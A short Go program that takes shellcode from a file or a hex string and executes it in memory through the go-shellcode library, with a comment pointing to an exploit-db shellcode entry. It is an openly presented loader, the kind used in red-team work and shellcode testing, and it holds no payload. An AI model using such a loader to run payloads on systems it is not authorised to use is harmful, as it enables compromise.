package main

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"

	shellcode "github.com/brimstone/go-shellcode"
)

// This program runs the shellcode from: https://www.exploit-db.com/exploits/40245/
//
// As the shellcode is 32 bit, this must also be compiled as a 32 bit go application
// via "set GOARCH=386"

func main() {

	if len(os.Args) != 2 {
		fmt.Printf("Must have shellcode of file\n")
		os.Exit(1)
	}

	// First, try to read the arg as a file
	sc, err := ioutil.ReadFile(os.Args[1])
	if os.IsNotExist(err) {
		// If that fails, try to interpret the arg as hex encoded
		sc, err = hex.DecodeString(os.Args[1])
		if err != nil {
			fmt.Printf("Error decoding arg 1: %s\n", err)
			os.Exit(1)
		}
	}

	shellcode.Run(sc)
}
